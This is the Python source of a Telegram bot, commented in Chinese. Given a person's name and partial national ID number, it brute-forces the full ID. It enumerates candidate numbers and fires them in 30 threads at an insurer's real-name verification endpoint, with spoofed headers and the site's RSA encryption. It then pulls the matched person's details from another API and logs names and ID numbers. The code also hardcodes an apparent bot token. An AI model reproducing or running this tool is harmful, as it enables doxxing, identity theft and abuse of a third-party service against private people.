# bot.py
import re
import requests
import base64
import hashlib
import json
import threading
import time
import asyncio
from queue import Queue
from pathlib import Path
from datetime import datetime
from collections import defaultdict
from telegram import Update
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    ContextTypes, filters
)
from apscheduler.schedulers.background import BackgroundScheduler
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5

# -------------------- 配置（请确认） --------------------
BOT_TOKEN = "8216980791:AAEvQLePTqhPimv_PqB47LgNcw77GyxIzig"  # ← 请确认/替换为你的 bot token
OWNER_USERNAME = "yeguanzhu"   # 主人用户名（不带 @）
OWNER_ID = 8166725099          # 主人数字 ID（双保险）

# 文件持久化路径
AUTH_FILE = Path("auth.json")
BAN_FILE = Path("ban.json")
STATS_FILE = Path("stats.log")
LOG_FILE = Path("logs.txt")

# 运行时内存结构
authorized_users = set()
banned_users = set()
user_requests = defaultdict(list)   # key -> [datetime,...]
user_state = {}  # user_id -> state dict（用于 /ys 交互）

# 命令说明
COMMANDS = {
    "start": "开始使用机器人（需授权）",
    "sq": "授权用户（仅主人）/sq 用户名",
    "unsq": "取消授权用户（仅主人）/unsq 用户名",
    "list": "查看授权用户列表（仅主人）",
    "ban": "拉黑用户（仅主人）/ban 用户名",
    "unban": "解除拉黑（仅主人）/unban 用户名",
    "banlist": "查看黑名单（仅主人）",
    "stats": "查看今日使用统计（仅主人）",
    "history": "查看最近7天的历史统计（仅主人）",
    "help": "查看命令列表",
    "ys": "/ys - 交互启动实名核验（先问姓名->证件->性别）"
}

# -------------------- 授权/黑名单持久化 --------------------
def load_auth():
    global authorized_users
    if AUTH_FILE.exists():
        try:
            data = json.loads(AUTH_FILE.read_text(encoding="utf-8"))
            authorized_users = set(data if isinstance(data, list) else [])
        except:
            authorized_users = set()
    else:
        authorized_users = set()

def save_auth():
    AUTH_FILE.write_text(json.dumps(list(authorized_users), ensure_ascii=False, indent=2), encoding="utf-8")

def load_ban():
    global banned_users
    if BAN_FILE.exists():
        try:
            data = json.loads(BAN_FILE.read_text(encoding="utf-8"))
            banned_users = set(data if isinstance(data, list) else [])
        except:
            banned_users = set()
    else:
        banned_users = set()

def save_ban():
    BAN_FILE.write_text(json.dumps(list(banned_users), ensure_ascii=False, indent=2), encoding="utf-8")

# -------------------- 权限判定 --------------------
def is_owner(user_id: int, username: str) -> bool:
    if user_id == OWNER_ID:
        return True
    if username and username == OWNER_USERNAME:
        return True
    return False

def is_authorized(username: str, user_id: int = None) -> bool:
    if is_owner(user_id, username):
        return True
    if username and username in authorized_users:
        return True
    return False

# -------------------- 限流 --------------------
def _user_key(username: str, user_id: int):
    return username if username else f"id:{user_id}"

def check_rate_limit(username: str, user_id: int) -> bool:
    key = _user_key(username, user_id)
    now = datetime.now()
    user_requests[key] = [t for t in user_requests[key] if (now - t).days == 0]
    today_requests = user_requests[key]

    last_minute = [t for t in today_requests if (now - t).seconds < 60]
    if len(last_minute) >= 3:
        return False
    if len(today_requests) >= 50:
        return False

    user_requests[key].append(now)
    return True

# -------------------- 日志/统计 --------------------
def write_log(username: str, name: str, id_card: str, result: str):
    time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{time_str}] 用户:{username or 'None'} 姓名:{name} 证件:{id_card} 结果:{result}\n"
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(line)

def write_daily_stats():
    now = datetime.now()
    date_str = now.strftime("%Y-%m-%d")
    lines = []
    for key, times in user_requests.items():
        today_times = [t for t in times if (now - t).days == 0]
        if today_times:
            lines.append(f"{key}: {len(today_times)} 次")
    if not lines:
        line = f"[{date_str}] 无使用记录\n"
    else:
        line = f"[{date_str}] " + " | ".join(lines) + "\n"
    with open(STATS_FILE, "a", encoding="utf-8") as f:
        f.write(line)
    user_requests.clear()
# -------------------- 随机语录 --------------------
def fetch_quote():
    url = "https://v.api.aa1.cn/api/api-wenan-aiqing/index.php?type=json"
    try:
        r = requests.get(url, timeout=6)
        text = r.text.strip()

        # 尝试解析 JSON
        try:
            j = json.loads(text)
        except Exception:
            return "🎵 今日语录获取失败"

        # 如果是字典，优先取 text -> content -> msg
        if isinstance(j, dict):
            for key in ("text", "content", "msg"):
                val = j.get(key)
                if val:
                    return f"🎵 今日语录：{val}"

        # 如果是数组，取第一个元素的 content/text/msg
        if isinstance(j, list) and j and isinstance(j[0], dict):
            for key in ("content", "text", "msg"):
                val = j[0].get(key)
                if val:
                    return f"🎵 今日语录：{val}"

        return "🎵 今日语录获取失败"
    except Exception:
        return "🎵 今日语录获取失败"
# -------------------- 身份证信息 API（只保留中文字段） --------------------
def fetch_id_info(id_card: str) -> str:
    url = f"https://zj.v.api.aa1.cn/api/sfz/?sfz={id_card}"
    try:
        r = requests.get(url, timeout=8)
        j = r.json()
    except Exception:
        return "✅ 核验成功，但身份证信息查询失败，请稍后再试。"
    lines = []
    for k, v in j.items():
        text = f"{k}: {v}"
        if re.search(r"[\u4e00-\u9fff]", text):
            lines.append(text)
    if not lines:
        return "✅ 核验成功，但接口没有返回有效的中文信息。"
    return "\n".join(lines)

# -------------------- 身份证工具（14->18补齐） --------------------
def clean_input(raw_input: str) -> str:
    if not raw_input:
        raise ValueError("输入不能为空")
    s = raw_input.strip()
    if s and s[-1].upper() == "X":
        main_part = re.sub(r"[^\d]", "", s[:-1])
        return main_part + "X"
    return re.sub(r"[^\d]", "", s)

def calculate_check_code(id_17: str) -> str:
    weights = [7,9,10,5,8,4,2,1,6,3,7,9,10,5,8,4,2]
    check_codes = "10X98765432"
    total = sum(int(a) * b for a,b in zip(id_17, weights))
    return check_codes[total % 11]

def generate_all_valid_ids(partial_id: str, gender: str = None, ignore_gender: bool = True):
    base = partial_id[:14]
    valid_ids = []
    for seq in range(0, 1000):
        seq_str = f"{seq:03d}"
        last_digit = int(seq_str[2])
        if not ignore_gender and gender:
            if gender == '男' and last_digit % 2 == 0:
                continue
            if gender == '女' and last_digit % 2 == 1:
                continue
        id17 = base + seq_str
        check_code = calculate_check_code(id17)
        valid_ids.append(id17 + check_code)
    return valid_ids

# -------------------- JD 实名接口（RSA + headers） --------------------
class Batch2YS:
    def __init__(self):
        self.RsaPubKeyStr = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCWmc4bKr/RQloO3SBk0PMdNTgxWwKwJNStiZXYX41bCFfgGI5P4tKNsxkv2JKjQpmXkchOiUT2/hQB6dOtDaKuvfbWRpSoEDNyTVZdavQ9Ubrh3gU0WojRyiN4ytEDOUW8G2Y59UIPZJhItUllkEwT5JlbIofLD3Aq3OZCI0VbUQIDAQAB"
        key_der = base64.b64decode(self.RsaPubKeyStr)
        self.public_key = RSA.importKey(key_der)
        self.cipher = PKCS1_v1_5.new(self.public_key)

    def encrypt_rsa(self, text: str) -> str:
        text_bytes = text.encode("utf-8")
        encrypted = self.cipher.encrypt(text_bytes)
        return base64.b64encode(encrypted).decode("utf-8")

    def compute_md5(self, text: str) -> str:
        return hashlib.md5(text.encode("utf-8")).hexdigest()

    def send_request(self, realName: str, idCard: str):
        sign_md5 = self.compute_md5(idCard)
        enc_text = self.encrypt_rsa(idCard)
        payload = {
            "certNo": enc_text,
            "certNoEncrypt": "",
            "certNoMd5": sign_md5,
            "certType": "1",
            "name": realName,
            "nameEncrypt": ""
        }
        headers = {
            "cache-control": "no-cache",
            "jdaz-h5-ver": "bd72ddcd&2025-07-10 10:25:50",
            "jdaz-host": "m.jdallianz.com",
            "jdaz-referer": "https://m.jdallianz.com/ins-temp-m/detail?jdaz_realm=sy_m&jdaz_site=jxbz_tab54&p=2166&v=29393107913029768",
            "origin": "https://m.jdallianz.com",
            "xxx-jdaz-app": "pc",
            "Content-Type": "application/json; charset=utf-8"
        }
        url = "https://m.jdallianz.com/c/api/360/tools/realName/verify"
        try:
            resp = requests.post(url, data=json.dumps(payload), headers=headers, timeout=6)
            try:
                return resp.json()
            except:
                return None
        except:
            return None

    def verify_id(self, realName: str, idCard: str) -> bool:
        j = self.send_request(realName, idCard)
        return bool(j and j.get("code") == "0000")

# -------------------- 多线程 Worker（修正版） --------------------
class YsWorker(threading.Thread):
    def __init__(self, task_queue: Queue, real_name: str, result_queue: Queue, stop_event: threading.Event):
        super().__init__()
        self.task_queue = task_queue
        self.real_name = real_name
        self.result_queue = result_queue
        self.stop_event = stop_event
        self.verifier = Batch2YS()
        self.daemon = True

    def run(self):
        while True:
            try:
                id_card = self.task_queue.get(timeout=0.5)
            except Exception:
                if self.stop_event.is_set():
                    break
                continue

            if id_card is None:
                try:
                    self.task_queue.task_done()
                except:
                    pass
                break

            if self.stop_event.is_set():
                try:
                    self.task_queue.task_done()
                except:
                    pass
                continue

            try:
                ok = self.verifier.verify_id(self.real_name, id_card)
                if ok:
                    try:
                        self.result_queue.put(id_card)
                        self.stop_event.set()
                    except:
                        pass
            except Exception:
                pass
            finally:
                try:
                    self.task_queue.task_done()
                except:
                    pass

# -------------------- /ys 交互流程（命令入口） --------------------
async def cmd_ys_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    username = update.effective_user.username
    user_id = update.effective_user.id
    if not is_authorized(username, user_id):
        await update.message.reply_text("🚫 未授权用户，请联系管理员申请使用。")
        return
    if username in banned_users:
        await update.message.reply_text("🚫 你已被拉黑，禁止使用。")
        return
    if not check_rate_limit(username, user_id):
        await update.message.reply_text("🚫 操作过于频繁，请稍后再试。")
        return

    # 初始化交互状态
    user_state[user_id] = {"ys_step": "ask_name"}
    await update.message.reply_text("请输入要核验的 姓名（例如：张三）：")

# 文本路由：处理 /ys 交互各步骤（姓名 -> 身份证 -> 性别）
async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    username = update.effective_user.username
    user_id = update.effective_user.id

    # 若处于交互流程，优先处理
    state = user_state.get(user_id)
    if state and state.get("ys_step"):
        step = state["ys_step"]
        text = (update.message.text or "").strip()
        if step == "ask_name":
            if not text:
                await update.message.reply_text("姓名不能为空，请重新输入：")
                return
            state["name"] = text
            state["ys_step"] = "ask_id"
            await update.message.reply_text("请输入身份证（14位 前14位 或 18位完整），例如：41010219900101 或 410102199001011234：")
            return
        elif step == "ask_id":
            if not text:
                await update.message.reply_text("身份证不能为空，请重新输入：")
                return
            cleaned = clean_input(text).upper()
            if len(cleaned) not in (14, 18):
                await update.message.reply_text("请输入 14 位（前14位）或 18 位身份证号：")
                return
            state["id_input"] = cleaned
            state["ys_step"] = "ask_gender"
            await update.message.reply_text("请输入性别（男 / 女 / 未知），可输入“未知”以不限定性别：")
            return
        elif step == "ask_gender":
            if not text:
                await update.message.reply_text("性别不能为空，请输入：男 / 女 / 未知")
                return
            t = text.strip()
            if t not in ("男", "女", "未知"):
                await update.message.reply_text("格式错误，请输入：男 或 女 或 未知")
                return
            state["gender"] = t
            state["ys_step"] = "running"
            await update.message.reply_text(f"已收到：姓名={state['name']} 身份证={state['id_input']} 性别={state['gender']}，开始核验...")
            context.application.create_task(run_ys_task_interactive(update, context, user_id))
            return
        elif step == "running":
            await update.message.reply_text("任务正在运行，请耐心等待结果或使用 /help 查看命令。")
            return

    # 不在交互流程 -> 普通文本处理（引导使用 /ys）
    if not is_authorized(username, user_id):
        await update.message.reply_text("🚫 未授权用户，请联系管理员申请使用。")
        return
    if username in banned_users:
        await update.message.reply_text("🚫 你已被拉黑，禁止使用。")
        return
    if not check_rate_limit(username, user_id):
        await update.message.reply_text("🚫 操作过于频繁，请稍后再试。")
        return
    await update.message.reply_text("请使用命令 /ys 来启动交互式核验，或使用 /help 查看所有命令。")

# -------------------- run_ys_task_interactive（修正版，替换原任务） --------------------
async def run_ys_task_interactive(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int):
    state = user_state.get(user_id, {})
    if not state:
        return
    real_name = state.get("name")
    id_input = state.get("id_input")
    gender = state.get("gender")
    chat_id = update.effective_chat.id
    threads = 30  # 默认线程数，可根据需要扩展成用户选择

    start_time = time.time()

    # 18位直接核验
    if len(id_input) == 18:
        verifier = Batch2YS()
        ok = verifier.verify_id(real_name, id_input)
        elapsed = time.time() - start_time
        if ok:
            info = fetch_id_info(id_input)
            msg = f"🎉 核验成功！\n姓名: {real_name}\n身份证: {id_input}\n用时: {elapsed:.1f} 秒\n\n{info}"
            await context.bot.send_message(chat_id, msg)
            write_log(update.effective_user.username, real_name, id_input, "成功")
        else:
            await context.bot.send_message(chat_id, "❌ 核验失败（18位）。")
            write_log(update.effective_user.username, real_name, id_input, "失败")
        user_state.pop(user_id, None)
        return

    # 14位补齐并爆破
    if len(id_input) != 14:
        await context.bot.send_message(chat_id, "❌ 输入长度不对（既非14也非18位）。")
        user_state.pop(user_id, None)
        return

    ignore_gender = (gender == "未知")
    all_ids = generate_all_valid_ids(id_input, gender=None if ignore_gender else gender, ignore_gender=ignore_gender)
    total = len(all_ids)
    if total == 0:
        await context.bot.send_message(chat_id, "❌ 无候选身份证，检查输入的前14位是否正确。")
        user_state.pop(user_id, None)
        return

    task_q = Queue()
    result_q = Queue()
    stop_evt = threading.Event()

    for idn in all_ids:
        task_q.put(idn)

    workers = []
    for _ in range(threads):
        w = YsWorker(task_q, real_name, result_q, stop_evt)
        w.start()
        workers.append(w)

    try:
        status_msg = await context.bot.send_message(chat_id, f"⏳ 开始核验（交互）：0/{total} | 线程: {threads}")
    except Exception:
        status_msg = None

    checked = 0
    last_report = 0
    success_id = None

    try:
        while True:
            remaining = task_q.qsize()
            checked = total - remaining

            now_t = time.time()
            if now_t - last_report >= 2:
                if status_msg:
                    try:
                        await context.bot.edit_message_text(chat_id=chat_id, message_id=status_msg.message_id,
                                                            text=f"进度: {checked}/{total} | 线程: {threads}")
                    except:
                        pass
                last_report = now_t

            if not result_q.empty():
                success_id = result_q.get()
                stop_evt.set()
                # 标记队列剩余任务为 done，避免 join 阻塞
                while not task_q.empty():
                    try:
                        _ = task_q.get_nowait()
                        task_q.task_done()
                    except Exception:
                        break
                break

            if task_q.empty() and all((not w.is_alive()) for w in workers):
                break

            await asyncio.sleep(0.5)
    finally:
        stop_evt.set()
        for _ in workers:
            try:
                task_q.put(None)
            except:
                pass
        try:
            task_q.join()
        except:
            pass
        for w in workers:
            try:
                w.join(timeout=1)
            except:
                pass

    elapsed = time.time() - start_time

    if success_id:
        info = fetch_id_info(success_id)
        msg = f"🎉 核验成功！\n姓名: {real_name}\n身份证: {success_id}\n用时: {elapsed:.1f} 秒\n\n{info}"
        await context.bot.send_message(chat_id, msg)
        write_log(update.effective_user.username, real_name, success_id, "成功")
        if status_msg:
            try:
                await context.bot.edit_message_text(chat_id=chat_id, message_id=status_msg.message_id,
                                                    text=f"任务完成：成功 - {success_id}（用时 {elapsed:.1f}s）")
            except:
                pass
    else:
        await context.bot.send_message(chat_id, "❌ 所有组合核验失败。")
        write_log(update.effective_user.username, real_name, id_input + "****", "失败")
        if status_msg:
            try:
                await context.bot.edit_message_text(chat_id=chat_id, message_id=status_msg.message_id,
                                                    text=f"任务完成：失败（用时 {elapsed:.1f}s）")
            except:
                pass

    user_state.pop(user_id, None)

# -------------------- 其余命令（授权/黑名单/统计/help/start） --------------------
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    username = update.effective_user.username
    user_id = update.effective_user.id
    if not is_authorized(username, user_id):
        await update.message.reply_text("🚫 未授权用户，请联系管理员申请使用。")
        return
    if username in banned_users:
        await update.message.reply_text("🚫 你已被拉黑，禁止使用。")
        return
    user_state[user_id] = {}
    await update.message.reply_text(fetch_quote())
    lines = ["📖 可用命令列表："]
    for cmd, desc in COMMANDS.items():
        lines.append(f"/{cmd} - {desc}")
    await update.message.reply_text("\n".join(lines))

# 授权（仅主人）
async def sq(update: Update, context: ContextTypes.DEFAULT_TYPE):
    caller_id = update.effective_user.id
    caller_name = update.effective_user.username
    if not is_owner(caller_id, caller_name):
        await update.message.reply_text("🚫 只有主人才能授权用户。")
        return
    if not context.args:
        await update.message.reply_text("用法: /sq 用户名")
        return
    username = context.args[0].strip().lstrip("@")
    if not username:
        await update.message.reply_text("请提供用户名（不带 @）。")
        return
    authorized_users.add(username)
    save_auth()
    await update.message.reply_text(f"✅ 用户 {username} 已被授权使用。")

# 取消授权（仅主人）
async def unsq(update: Update, context: ContextTypes.DEFAULT_TYPE):
    caller_id = update.effective_user.id
    caller_name = update.effective_user.username
    if not is_owner(caller_id, caller_name):
        await update.message.reply_text("🚫 只有主人才能取消授权。")
        return
    if not context.args:
        await update.message.reply_text("用法: /unsq 用户名")
        return
    username = context.args[0].strip().lstrip("@")
    if username in authorized_users:
        authorized_users.remove(username)
        save_auth()
        await update.message.reply_text(f"✅ 用户 {username} 已被取消授权。")
    else:
        await update.message.reply_text(f"ℹ️ 用户 {username} 不在授权列表中。")

# 列表授权（仅主人）
async def list_auth(update: Update, context: ContextTypes.DEFAULT_TYPE):
    caller_id = update.effective_user.id
    caller_name = update.effective_user.username
    if not is_owner(caller_id, caller_name):
        await update.message.reply_text("🚫 只有主人才能查看授权列表。")
        return
    if not authorized_users:
        await update.message.reply_text("📋 当前没有任何已授权用户。")
        return
    users = "\n".join(f"✅ {u}" for u in sorted(authorized_users))
    await update.message.reply_text(f"📋 已授权用户列表：\n{users}")

# 拉黑（仅主人）
async def ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    caller_id = update.effective_user.id
    caller_name = update.effective_user.username
    if not is_owner(caller_id, caller_name):
        await update.message.reply_text("🚫 只有主人能拉黑用户。")
        return
    if not context.args:
        await update.message.reply_text("用法: /ban 用户名")
        return
    username = context.args[0].strip().lstrip("@")
    if not username:
        await update.message.reply_text("请提供用户名（不带 @）。")
        return
    banned_users.add(username)
    save_ban()
    await update.message.reply_text(f"✅ 用户 {username} 已被拉黑。")

# 解除拉黑（仅主人）
async def unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    caller_id = update.effective_user.id
    caller_name = update.effective_user.username
    if not is_owner(caller_id, caller_name):
        await update.message.reply_text("🚫 只有主人能解除拉黑。")
        return
    if not context.args:
        await update.message.reply_text("用法: /unban 用户名")
        return
    username = context.args[0].strip().lstrip("@")
    if username in banned_users:
        banned_users.remove(username)
        save_ban()
        await update.message.reply_text(f"✅ 用户 {username} 已解除拉黑。")
    else:
        await update.message.reply_text(f"ℹ️ 用户 {username} 不在黑名单中。")

# 黑名单列表（仅主人）
async def banlist(update: Update, context: ContextTypes.DEFAULT_TYPE):
    caller_id = update.effective_user.id
    caller_name = update.effective_user.username
    if not is_owner(caller_id, caller_name):
        await update.message.reply_text("🚫 只有主人才能查看黑名单。")
        return
    if not banned_users:
        await update.message.reply_text("📋 当前黑名单为空。")
        return
    users = "\n".join(f"🚫 {u}" for u in sorted(banned_users))
    await update.message.reply_text(f"📋 黑名单用户：\n{users}")

# 统计（仅主人）
async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    caller_id = update.effective_user.id
    caller_name = update.effective_user.username
    if not is_owner(caller_id, caller_name):
        await update.message.reply_text("🚫 只有主人能查看统计。")
        return
    now = datetime.now()
    lines = []
    for key, times in user_requests.items():
        today_times = [t for t in times if (now - t).days == 0]
        if today_times:
            lines.append(f"👤 {key}: {len(today_times)} 次")
    if not lines:
        await update.message.reply_text("📊 今天还没有任何使用记录。")
    else:
        await update.message.reply_text("📊 今日使用统计：\n" + "\n".join(lines))

# history（仅主人）
async def history(update: Update, context: ContextTypes.DEFAULT_TYPE):
    caller_id = update.effective_user.id
    caller_name = update.effective_user.username
    if not is_owner(caller_id, caller_name):
        await update.message.reply_text("🚫 只有主人能查看历史统计。")
        return
    if not STATS_FILE.exists():
        await update.message.reply_text("📂 没有历史统计记录。")
        return
    lines = STATS_FILE.read_text(encoding="utf-8").strip().splitlines()
    if not lines:
        await update.message.reply_text("📂 没有历史统计记录。")
        return
    last_lines = lines[-7:]
    await update.message.reply_text("📊 最近7天使用统计：\n" + "\n".join(last_lines))

# help
async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    lines = ["📖 可用命令列表："]
    for cmd, desc in COMMANDS.items():
        lines.append(f"/{cmd} - {desc}")
    await update.message.reply_text("\n".join(lines))

# -------------------- 启动 / 主入口 --------------------
def main():
    load_auth()
    load_ban()

    app = Application.builder().token(BOT_TOKEN).build()

    # 注册命令
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("ys", cmd_ys_start))
    app.add_handler(CommandHandler("sq", sq))
    app.add_handler(CommandHandler("unsq", unsq))
    app.add_handler(CommandHandler("list", list_auth))
    app.add_handler(CommandHandler("ban", ban))
    app.add_handler(CommandHandler("unban", unban))
    app.add_handler(CommandHandler("banlist", banlist))
    app.add_handler(CommandHandler("stats", stats))
    app.add_handler(CommandHandler("history", history))
    app.add_handler(CommandHandler("help", help_cmd))

    # 文本消息（交互流程或引导）
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))

    # 定时任务：每天 23:59 写统计
    scheduler = BackgroundScheduler()
    scheduler.add_job(write_daily_stats, "cron", hour=23, minute=59)
    scheduler.start()

    print("🤖 Bot 已启动！")
    app.run_polling()

if __name__ == "__main__":
    main()
